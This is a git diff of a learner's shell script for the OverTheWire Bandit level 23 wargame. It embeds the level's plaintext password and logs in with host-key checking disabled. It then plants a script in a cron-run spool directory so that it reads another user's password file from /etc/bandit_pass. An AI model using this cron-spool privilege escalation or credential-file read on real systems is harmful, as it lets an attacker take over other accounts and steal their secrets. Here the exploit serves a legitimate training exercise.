@@ -13,7 +13,36 @@ port=2220
 user="bandit23"
 password=0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 
-sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host
+# sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host 
+sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host << 'EOF'
+
+cd /tmp/   
+mkdir vivek
+cd vivek
+pwd
+
+# echo '#!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/vivek/pass' > script.sh
+cat << 'EOL' > script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/vivek/pass
+EOL
+
+# chmod +x script.sh # this dosen't work due to ownership issues
+chmod 777 script.sh
+cat script.sh
+touch pass
+chmod 666 pass
+cp script.sh /var/spool/bandit24/foo/
+echo "Wait for 1 min ... "
+sleep 70
+
+echo "Pasword for bandit 24 is : "
+cat pass
+
+rm -rf /tmp/vivek
+cd /tmp/vivek/ | & 
+
+EOF
 
 # cd 
 # cat cronjob_bandit24
@@ -44,8 +73,11 @@ sshpass -p $password ssh -o StrictHostKeyChecking=no -p $port $user@$host
 # the script explanation with exploit that i can use : https://chatgpt.com/share/68b2c9f9-2f9c-8006-be9e-b35e891c4321
 # so basically if i create a script and paste it inside the /var/spool/bandit24 file it will run it as bandit 24 which we can exploit to cat the pass of bandit24
 
+# i can't solve it the script won't run don't know why !
 
 
+# ----gpt can't help had to resarch on my own 
+# https://medium.com/secttp/overthewire-bandit-level-23-424786d305bf   # worked using this blog as refernce
 
 # bandit23@bandit:/etc/cron.d$ stat cronjob_bandit24 --format '%U'
 # root
